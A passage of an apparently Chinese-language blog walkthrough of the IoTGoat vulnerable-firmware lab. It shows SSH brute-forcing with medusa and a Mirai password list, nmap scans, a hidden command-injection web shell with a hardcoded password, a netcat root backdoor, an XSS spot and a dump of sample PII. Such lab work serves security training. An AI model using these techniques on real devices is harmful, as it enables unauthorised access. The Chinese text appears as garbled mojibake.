&#39;&#123;print $2&#125;&#39; SecLists/Passwords/Malware/mirai-botnet.txt &gt; SecLists/Passwords/Malware/mirai-botnet_passwords.txt</code>æ¥æŠŠå¯†ç éƒ¨åˆ†å¯¼å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œ</p><p>ç„¶å</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ medusa -u iotgoatuser -P .<span class="hljs-regexp">/SecLists/</span>Passwords<span class="hljs-regexp">/Malware/mi</span>rai-botnet_passwords.txt -h <span class="hljs-number">192.168</span>.<span class="hljs-number">56.101</span> -M ssh<br></code></pre></td></tr></table></figure><p>å³å¯çˆ†ç ´åˆ°sshçš„å¯†ç <code>7ujMko0vizxv</code></p><h2 id="No-2-Insecure-Network-Services"><a href="#No-2-Insecure-Network-Services" class="headerlink" title="No 2: Insecure Network Services:"></a>No 2: Insecure Network Services:</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh">kali@kali:~/Desktop/IoTGoat$ nmap -p20-6000 192.168.56.101<br>Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 02:45 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.101 (192.168.56.101)<br>Host is up (0.0026s latency).<br>Not shown: 5973 filtered ports<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>25/tcp   open  smtp<br>53/tcp   open  domain                <br>80/tcp   open  http                                       110/tcp  open  pop3<br>443/tcp  open  https                                       5000/tcp open  upnp                                       5515/tcp open  unknown<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ali</span>@kali:~/Desktop/IoTGoat$ sudo nmap -sU -p<span class="hljs-number">20</span>-<span class="hljs-number">6000</span> <span class="hljs-number">192.168.56.101</span> &gt; ScanUdpResult.txt                         kali@kali:~/Desktop/IoTGoat$ cat ScanUdpResult.txt <br><span class="hljs-attribute">Starting</span> Nmap <span class="hljs-number">7</span>.<span class="hljs-number">80</span> ( https://nmap.org ) at <span class="hljs-number">2020</span>-<span class="hljs-number">11</span>-<span class="hljs-number">09</span> <span class="hljs-number">03</span>:<span class="hljs-number">20</span> EST                                                 Nmap scan report for <span class="hljs-number">192.168.56.101</span> (<span class="hljs-number">192.168.56.101</span>)       Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">00058</span>s latency).                             Not shown: <span class="hljs-number">5980</span> open|filtered ports                      PORT   STATE SERVICE                                       <span class="hljs-number">53</span>/udp open  domain                                       Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">16</span>.<span class="hljs-number">01</span> seconds  <br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘çš„upnpå¥½åƒä¸èµ·ä½œç”¨ï¼Œåªèƒ½è´´wpäº†</p><blockquote><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">nmap -p5000 -sV 172.16.100.213<br>Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 23:10 EDT<br>Nmap scan report for IoTGoat (172.16.100.213)<br>Host is up (0.00045s latency).<br><br>PORT     STATE SERVICE VERSION<br>5000/tcp open  upnp    MiniUPnP 2.1 (UPnP 1.1)<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port5000-TCP:V=7.80<span class="hljs-variable">%I=7%</span>D=5/4<span class="hljs-variable">%Time=5EB0D91A%</span>P=x86_64-pc-linux-gnu<span class="hljs-variable">%r(Gen</span><br><span class="hljs-variable">SF:ericLines,124,&quot;\x20501\x20Not\x20Implemented\r\nContent-Type:\x20text/h</span><br><span class="hljs-variable">SF:tml\r\nConnection:\x20close\r\nContent-Length:\x20149\r\nServer:\x20Ope</span><br><span class="hljs-variable">SF:nWRT/18\.06\.2\x20UPnP/1\.1\x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n&lt;HTML&gt;&lt;HEA</span><br><span class="hljs-variable">SF:D&gt;&lt;TITLE&gt;501\x20Not\x20Implemented&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not\x20Imple</span><br><span class="hljs-variable">SF:mented&lt;/H1&gt;The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x20t</span><br><span class="hljs-variable">SF:his\x20server\.&lt;/BODY&gt;&lt;/HTML&gt;\r\n&quot;)%</span>r(GetRequest,117,&quot;HTTP/1<span class="hljs-symbol">\.</span>0<span class="hljs-symbol">\x</span>20404\<br>SF:x20Not<span class="hljs-symbol">\x</span>20Found<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Type:<span class="hljs-symbol">\x</span>20text/html<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Connection:<span class="hljs-symbol">\x</span>20close<span class="hljs-symbol">\r</span><br>SF:<span class="hljs-symbol">\n</span>Content-Length:<span class="hljs-symbol">\x</span>20134<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Server:<span class="hljs-symbol">\x</span>20OpenWRT/18<span class="hljs-symbol">\.</span>06<span class="hljs-symbol">\.</span>2<span class="hljs-symbol">\x</span>20UPnP/1<span class="hljs-symbol">\.</span>1<span class="hljs-symbol">\x</span><br>SF:20MiniUPnPd/2<span class="hljs-symbol">\.</span>1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>[SNIP]<br>&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not<span class="hljs-symbol">\x</span>20Implemented&lt;<br>SF:/H1&gt;The<span class="hljs-symbol">\x</span>20HTTP<span class="hljs-symbol">\x</span>20Method<span class="hljs-symbol">\x</span>20is<span class="hljs-symbol">\x</span>20not<span class="hljs-symbol">\x</span>20implemented<span class="hljs-symbol">\x</span>20by<span class="hljs-symbol">\x</span>20this<span class="hljs-symbol">\x</span>20<br>SF:server<span class="hljs-symbol">\.</span>&lt;/BODY&gt;&lt;/HTML&gt;<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&quot;);<br>MAC Address: 00:0C:29:00:AC:E7<br></code></pre></td></tr></table></figure><p>Analyze the service detection response details and note information such as the service version (<code>MiniUPnP 2.1</code>), server version (<code>OpenWrt 18.06.2</code>), as well as the error code details. Proceed with interrogating each listening services with aggressive scripts that aid in vulnerability identification based on service versioning. Try searching for appropriate <code>nmap scripts</code> in Kali Linux under <code>/usr/share/nmap/scripts</code> directory. A <code>upnp</code> example using <code>broadcast-upnp-info</code> script is shown below.</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs coq">nmap -sV --script=broadcast-upnp-info <span class="hljs-number">172.16</span><span class="hljs-number">.100</span><span class="hljs-number">.213</span><br>Starting Nmap <span class="hljs-number">7.80</span> ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2020</span><span class="hljs-number">-05</span><span class="hljs-number">-04</span> <span class="hljs-number">23</span>:<span class="hljs-number">39</span> EDT<br>Pre-scan script results:<br>| <span class="hljs-type">broadcast</span>-upnp-info: <br>|   <span class="hljs-type">239</span><span class="hljs-number">.255</span><span class="hljs-number">.255</span><span class="hljs-number">.250</span><br>|       <span class="hljs-type">Server</span>: OpenWRT/<span class="hljs-number">18.06</span><span class="hljs-number">.2</span> UPnP/<span class="hljs-number">1.1</span> MiniUPnPd/<span class="hljs-number">2.1</span><br>|       <span class="hljs-type">Location</span>: http://<span class="hljs-number">192.168</span><span class="hljs-number">.50</span><span class="hljs-number">.143</span>:<span class="hljs-number">5000</span>/rootDesc.xml<br>|         <span class="hljs-type">Webserver</span>: OpenWRT/<span class="hljs-number">18.06</span><span class="hljs-number">.2</span> UPnP/<span class="hljs-number">1.1</span> MiniUPnPd/<span class="hljs-number">2.1</span><br>|         <span class="hljs-type">Name</span>: OpenWRT router<br>|         <span class="hljs-type">Manufacturer</span>: OpenWRT<br>|         <span class="hljs-type">Model</span> Descr: OpenWRT router<br>|         <span class="hljs-type">Model</span> Name: OpenWRT router<br>|         <span class="hljs-type">Model</span> Version: <span class="hljs-number">1</span><br>|         <span class="hljs-type">Name</span>: WANDevice<br>|         <span class="hljs-type">Manufacturer</span>: MiniUPnP<br>|         <span class="hljs-type">Model</span> Descr: WAN Device<br>|         <span class="hljs-type">Model</span> Name: WAN Device<br>|         <span class="hljs-type">Model</span> Version: <span class="hljs-number">20190130</span><br>|         <span class="hljs-type">Name</span>: WANConnectionDevice<br>|         <span class="hljs-type">Manufacturer</span>: MiniUPnP<br>|         <span class="hljs-type">Model</span> Descr: MiniUPnP daemon<br>|         <span class="hljs-type">Model</span> Name: MiniUPnPd<br>|<span class="hljs-type">_</span>        Model Version: <span class="hljs-number">20190130</span><br>[SNIP]<br>Nmap scan report <span class="hljs-keyword">for</span> IoTGoat (<span class="hljs-number">192.168</span><span class="hljs-number">.50</span><span class="hljs-number">.143</span>)<br>Host is up (<span class="hljs-number">0.00045</span>s latency).<br>Not shown: <span class="hljs-number">995</span> closed ports<br>PORT     STATE SERVICE  VERSION<br><span class="hljs-number">22</span>/tcp   open  ssh      Dropbear sshd (protocol <span class="hljs-number">2.0</span>)<br><span class="hljs-number">53</span>/tcp   open  domain   dnsmasq <span class="hljs-number">2.73</span><br><span class="hljs-number">80</span>/tcp   open  http     LuCI Lua http config<br><span class="hljs-number">443</span>/tcp  open  ssl/http LuCI Lua http config<br><span class="hljs-number">5000</span>/tcp open  upnp     MiniUPnP <span class="hljs-number">2.1</span> (UPnP <span class="hljs-number">1.1</span>)<br>| <span class="hljs-type">fingerprint</span>-strings: <br>|   <span class="hljs-type">FourOhFourRequest</span>, GetRequest: <br>|     <span class="hljs-type">HTTP</span>/<span class="hljs-number">1.0</span> <span class="hljs-number">404</span> Not Found<br>|     <span class="hljs-type">Content</span>-<span class="hljs-keyword">Type</span>: text/html<br>|     <span class="hljs-type">Connection</span>: close<br>|     <span class="hljs-type">Content</span>-Length: <span class="hljs-number">134</span><br>|     <span class="hljs-type">Server</span>: OpenWRT/<span class="hljs-number">18.06</span><span class="hljs-number">.2</span> UPnP/<span class="hljs-number">1.1</span> MiniUPnPd/<span class="hljs-number">2.1</span><br>|     <span class="hljs-type">Ext</span>:<br>|     <span class="hljs-type">&lt;HTML</span>&gt;&lt;HEAD&gt;&lt;TITLE&gt;<span class="hljs-number">404</span> Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not Found&lt;/H1&gt;The requested URL was not found on this server.&lt;/BODY&gt;&lt;/HTML&gt;<br>|   <span class="hljs-type">GenericLines</span>: <br>|     <span class="hljs-type">501</span> Not Implemented<br>|     <span class="hljs-type">Content</span>-<span class="hljs-keyword">Type</span>: text/html<br>|     <span class="hljs-type">Connection</span>: close<br>|     <span class="hljs-type">Content</span>-Length: <span class="hljs-number">149</span><br>|     <span class="hljs-type">Server</span>: OpenWRT/<span class="hljs-number">18.06</span><span class="hljs-number">.2</span> UPnP/<span class="hljs-number">1.1</span> MiniUPnPd/<span class="hljs-number">2.1</span><br>|     <span class="hljs-type">Ext</span>:<br>|     <span class="hljs-type">&lt;HTML</span>&gt;&lt;HEAD&gt;&lt;TITLE&gt;<span class="hljs-number">501</span> Not Implemented&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not Implemented&lt;/H1&gt;The HTTP Method is not implemented <span class="hljs-built_in">by</span> this server.&lt;/BODY&gt;&lt;/HTML&gt;<br>|   <span class="hljs-type">HTTPOptions</span>: <br>[SNIP] <br></code></pre></td></tr></table></figure></blockquote><h2 id="No-3-Insecure-Ecosystem-Interfaces"><a href="#No-3-Insecure-Ecosystem-Interfaces" class="headerlink" title="No 3: Insecure Ecosystem Interfaces:"></a>No 3: Insecure Ecosystem Interfaces:</h2><h3 id="éšè—çš„web-shell"><a href="#éšè—çš„web-shell" class="headerlink" title="éšè—çš„web shell"></a>éšè—çš„web shell</h3><p>åœ¨webæœåŠ¡å™¨configæ–‡ä»¶<code>./etc/config/uhttpd</code>å¯ä»¥çœ‹åˆ°<code>lua_prefix</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">kali<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/Desktop/IoTGoat/_IoTGoat-x86</span>.img.extracted/squashfs-root<span class="hljs-variable">$ </span>cat ./etc/config/uhttpd | grep <span class="hljs-string">&quot;/&quot;</span><br>        option home             /www<br>        option cert             /etc/uhttpd.crt<br>        option key              /etc/uhttpd.key<br>        <span class="hljs-comment"># Default is /cgi-bin</span><br>        option cgi_prefix       /cgi-bin<br>        list lua_prefix         <span class="hljs-string">&quot;/cgi-bin/luci=/usr/lib/lua/luci/sgi/uhttpd.lua&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªlua_prefixæ˜¯ç”¨æ¥è·³è½¬åˆ°å¯¹åº”æ–‡ä»¶çš„ï¼Œå¯å‚è€ƒ<a href="https://blog.csdn.net/qq_26202991/article/details/102621184">è¿™é‡Œ</a></p><p>ç„¶ååœ¨<code>./usr/lib/lua/luci/</code>å¯ä»¥çœ‹è§</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">â”œâ”€â”€â”€<span class="hljs-keyword">cbi</span><br>â”œâ”€â”€â”€controller<br>â”‚   â”œâ”€â”€â”€admin<br>â”‚   â””â”€â”€â”€iotgoat<br>â”‚   â”œâ”€â”€â”€<span class="hljs-keyword">cbi</span><br>â”‚   â”‚   â”œâ”€â”€â”€admin_network<br>â”‚   â”‚   â”œâ”€â”€â”€admin_status<br>â”‚   â”‚   â”œâ”€â”€â”€admin_system<br>â”‚   â”‚   â”‚   â””â”€â”€â”€fstab<br>â”‚   â”‚   â”œâ”€â”€â”€firewall<br>â”‚   â”‚   â””â”€â”€â”€upnp<br>â”‚   â””â”€â”€â”€network<br>â”œâ”€â”€â”€sgi<br>â”œâ”€â”€â”€sys<br>â”‚   â””â”€â”€â”€zoneinfo<br>â”œâ”€â”€â”€template<br>â”œâ”€â”€â”€tools<br>    â”œâ”€â”€â”€admin_network<br>    â”‚   â””â”€â”€â”€index<br>    â”œâ”€â”€â”€admin_system<br>    â”œâ”€â”€â”€admin_uci<br>    â”œâ”€â”€â”€<span class="hljs-keyword">cbi</span><br>    â”œâ”€â”€â”€firewall<br>    â”œâ”€â”€â”€iotgoat<br>        â””â”€â”€â”€bootstrap<br></code></pre></td></tr></table></figure><p>åœ¨<code>controller/iotgoat/iotgoat.lua</code>ä¸­å¯ä»¥çœ‹åˆ°indexå‡½æ•°</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span></span><br>    entry(&#123;<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;iotgoat&quot;</span>&#125;, firstchild(), <span class="hljs-string">&quot;IoTGoat&quot;</span>, <span class="hljs-number">60</span>).dependent=<span class="hljs-literal">false</span><br>    entry(&#123;<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;iotgoat&quot;</span>, <span class="hljs-string">&quot;cmdinject&quot;</span>&#125;, template(<span class="hljs-string">&quot;iotgoat/cmd&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">1</span>)<br>    entry(&#123;<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;iotgoat&quot;</span>, <span class="hljs-string">&quot;cam&quot;</span>&#125;, template(<span class="hljs-string">&quot;iotgoat/camera&quot;</span>), <span class="hljs-string">&quot;Camera&quot;</span>, <span class="hljs-number">2</span>)<br>    entry(&#123;<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;iotgoat&quot;</span>, <span class="hljs-string">&quot;door&quot;</span>&#125;, template(<span class="hljs-string">&quot;iotgoat/door&quot;</span>), <span class="hljs-string">&quot;Doorlock&quot;</span>, <span class="hljs-number">3</span>)<br>    entry(&#123;<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;iotgoat&quot;</span>, <span class="hljs-string">&quot;webcmd&quot;</span>&#125;, call(<span class="hljs-string">&quot;webcmd&quot;</span>))<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>åœ¨<code>view/iotgoat/</code>é‡Œæœ‰<code>cmd.html</code></p><p>æ‰€ä»¥è®¿é—®<code>https://&lt;IoTGoat_IP&gt;/cgi-bin/luci/admin/iotgoat/cmdinject</code>å³å¯</p><p>éœ€è¦ç™»é™†å¯†ç ï¼Œ<code>iotgoathardcodedpassword</code></p><p>åœ¨cmdä¸­è¾“å…¥<code>telnet -p 9999</code>ï¼Œlinux ncå³å¯è¿å…¥</p><blockquote><p>æ›´å¤šæœ‰å…³luciå¯ä»¥å‚è€ƒ</p><p><a href="https://www.cnblogs.com/x_wukong/p/4505240.html">luciæ¡†æ¶-LUAçš„ä¸€ä¸ªwebæ¡†æ¶ä½¿ç”¨</a></p><p><a href="https://github.com/openwrt/luci/wiki">openwrt luciçš„wiki</a></p></blockquote><h3 id="åé—¨"><a href="#åé—¨" class="headerlink" title="åé—¨"></a>åé—¨</h3><p>å‰é¢æœ‰ä¸ª5515ç«¯å£æ˜¯æœªçŸ¥çš„ï¼Œncè¿ä¸€ä¸‹å±…ç„¶æ˜¯åé—¨ã€‚ã€‚</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs tcl">nc <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.102</span> <span class="hljs-number">5515</span><br>[***]Successfully Connected to IoTGoat&#x27;s Backdoor[***]<br><br>ls<br>bin<br>boot<br>dev<br>dnsmasq_setup.sh<br>etc<br>lib<br>mnt<br>overlay<br><span class="hljs-keyword">proc</span><br>rom<br>root<br>sbin<br>sys<br>tmp<br>usr<br>var<br>www<br><br>id<br>uid=0(root)<span class="hljs-title"> gid=0(root)</span><br></code></pre></td></tr></table></figure><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>Network/Firewall/Traffic Rulesé‡Œ</p><p>New forward rule ã€ New source NAT çš„Name æœ‰XSS</p><blockquote><p>å¿«é€Ÿäº†è§£ï¼š<a href="https://zhuanlan.zhihu.com/p/26177815">æµ…è°ˆXSSæ”»å‡»çš„é‚£äº›äº‹ï¼ˆé™„å¸¸ç”¨ç»•è¿‡å§¿åŠ¿ï¼‰</a></p></blockquote><h2 id="No-4-Lack-of-Secure-Update-Mechanism"><a href="#No-4-Lack-of-Secure-Update-Mechanism" class="headerlink" title="No 4: Lack of Secure Update Mechanism:"></a>No 4: Lack of Secure Update Mechanism:</h2><h3 id="Insecure-package-update-configuration-defaults-including-CVE-2020-7982"><a href="#Insecure-package-update-configuration-defaults-including-CVE-2020-7982" class="headerlink" title="Insecure package update configuration defaults including CVE-2020-7982."></a>Insecure package update configuration defaults including CVE-2020-7982.</h3><p><a href="https://www.anquanke.com/post/id/202039">OPENWRTä¸­çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-7982ï¼‰[CN]</a></p><h2 id="No-5-Use-of-Insecure-or-Outdated-Components"><a href="#No-5-Use-of-Insecure-or-Outdated-Components" class="headerlink" title="No 5: Use of Insecure or Outdated Components:"></a>No 5: Use of Insecure or Outdated Components:</h2><h3 id="Several-insecure-and-outdated-software-components-with-CVEs-such-as-Dnsmasq-pppd-Linux-Kernel-BusyBox-wpa-supplicant-and-more"><a href="#Several-insecure-and-outdated-software-components-with-CVEs-such-as-Dnsmasq-pppd-Linux-Kernel-BusyBox-wpa-supplicant-and-more" class="headerlink" title="Several insecure and outdated software components with CVEs such as Dnsmasq, pppd, Linux Kernel, BusyBox, wpa_supplicant, and more."></a>Several insecure and outdated software components with CVEs such as Dnsmasq, pppd, Linux Kernel, BusyBox, wpa_supplicant, and more.</h3><p>Todo: auto scan</p><p>TLS 1.2</p><p>ssh 2.0</p><p>pppd 2.4.7</p><p>Dnsmasq 2.73</p><p>wpa_supplicant v2.7-devel</p><p>BusyBox v1.28.4</p><h2 id="No-6-Insufficient-Privacy-Protection"><a href="#No-6-Insufficient-Privacy-Protection" class="headerlink" title="No 6: Insufficient Privacy Protection:"></a>No 6: Insufficient Privacy Protection:</h2><h3 id="PII-data-captured-and-stored-insecurely"><a href="#PII-data-captured-and-stored-insecurely" class="headerlink" title="PII data captured and stored insecurely."></a>PII data captured and stored insecurely.</h3><p>Personally identifiable information (PII)</p><p>firmwalkeræœç´¢çš„dbæ–‡ä»¶</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">##################################### *.db<br>/usr/lib/lua/luci/controller/iotgoat/sensordata.db<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨sqlite3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kali</span>@kali:~/Desktop/IoTGoat/_IoTGoat-x<span class="hljs-number">86</span>.img.extracted/squashfs-root/usr/lib/lua/luci/controller/iotgoat$ sqlite<span class="hljs-number">3</span> sensordata.db <br><span class="hljs-attribute">SQLite</span> version <span class="hljs-number">3</span>.<span class="hljs-number">32</span>.<span class="hljs-number">3</span> <span class="hljs-number">2020</span>-<span class="hljs-number">06</span>-<span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">00</span>:<span class="hljs-number">33</span><br><span class="hljs-attribute">Enter</span> <span class="hljs-string">&quot;.help&quot;</span> for usage hints.<br><span class="hljs-attribute">sqlite</span>&gt; .dump<br><span class="hljs-attribute">PRAGMA</span> foreign_keys=<span class="hljs-literal">OFF</span>;<br><span class="hljs-attribute">BEGIN</span> TRANSACTION;<br><span class="hljs-attribute">CREATE</span> TABLE sensors(id INTEGER PRIMARY KEY AUTOINCREMENT, temperature NUMERIC, humidity NUMERIC, currentdate DATE, currentime TIME, name TEXT, email TEXT, birthdate NUMERIC);<br><span class="hljs-attribute">INSERT</span> INTO sensors VALUES(<span class="hljs-number">1</span>,<span class="hljs-number">22</span>.<span class="hljs-number">399999999999998579</span>,<span class="hljs-number">68</span>,&#x27;<span class="hljs-number">2020</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>&#x27;,&#x27;<span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">33</span>&#x27;,&#x27;johnsmith&#x27;,&#x27;johnsmith@gmail.com&#x27;,<span class="hljs-number">1311977</span>);<br><span class="hljs-attribute">INSERT</span> INTO sensors VALUES(<span class="hljs-number">2</span>,<span class="hljs-number">29</span>.<span class="hljs-number">699999999999999289</span>,<span class="hljs-number">98</span>,&#x27;<span class="hljs-number">2020</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>&#x27;,&#x27;<span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">43</span>&#x27;,&#x27;jillsmith&#x27;,&#x27;jillsmith@gmail.com&#x27;,<span class="hljs-number">4141979</span>);<br><span class="hljs-attribute">INSERT</span> INTO sensors VALUES(<span class="hljs-number">3</span>,<span class="hljs-number">31</span>.<span class="hljs-number">199999999999999289</span>,<span class="hljs-number">28</span>,&#x27;<span class="hljs-number">2020</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>&#x27;,&#x27;<span class="hljs-number">18</span>:<span class="hljs-number">57</span>:<span class="hljs-number">05</span>&#x27;,&#x27;walter&#x27;,&#x27;waltergary@yopmail.com&#x27;,<span class="hljs-number">32821969</span>);<br><span class="hljs-attribute">INSERT</span> INTO sensors VALUES(<span class="hljs-number">4</span>,<span class="hljs-number">16</span>.<span class="hljs-number">899999999999998578</span>,<span class="hljs-number">38</span>,&#x27;<span class="hljs-number">2020</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>&#x27;,&#x27;<span class="hljs-number">18</span>:<span class="hljs-number">57</span>:<span class="hljs-number">20</span>&#x27;,&#x27;WilliamRonald&#x27;,&#x27;billronald@yopmail.com&#x27;,<span class="hljs-number">11141989</span>);<br><span class="hljs-attribute">INSERT</span> INTO sensors VALUES(<span class="hljs-number">5</span>,<span class="hljs-number">35</span>,<span class="hljs-number">78</span>,&#x27;<span class="hljs-number">2020</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>&#x27;,&#x27;<span class="hljs-number">18</span>:<span class="hljs-number">58</span>:<span class="hljs-number">04</span>&#x27;,&#x27;Test&#x27;,&#x27;TstUser@aol.com&#x27;,<span class="hljs-number">12121990</span>);<br><span class="hljs-attribute">INSERT</span> INTO sensors VALUES(<span class="hljs-number">6</span>,<span class="hljs-number">35</span>,<span class="hljs-number">88</span>,&#x27;<span class="hljs-number">2020</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>&#x27;,&#x27;<span class="hljs-number">18</span>:<span class="hljs-number">58</span>:<span class="hljs-number">18</span>&#x27;,&#x27;Sgt&#x27;,&#x27;sgtmajor@us.gov&#x27;,<span class="hljs-number">10171956</span>);<br><span class="hljs-attribute">DELETE</span> FROM sqlite_sequence;<br><span class="hljs-attribute">INSERT</span> INTO sqlite_sequence VALUES(&#x27;sensors&#x27;,<span class="hljs-number">6</span>);<br><span class="hljs-attribute">COMMIT</span>;<br><span class="hljs-attribute">sqlite</span>&gt; <br><br></code></pre></td></tr></table></figure><h2 id="No-7-Insecure-Data-Transfer-and-Storage"><a href="#No-7-Insecure-Data-Transfer-and-Storage" class="headerlink" title="No 7: Insecure Data Transfer and Storage:"></a>No 7: Insecure Data Transfer and 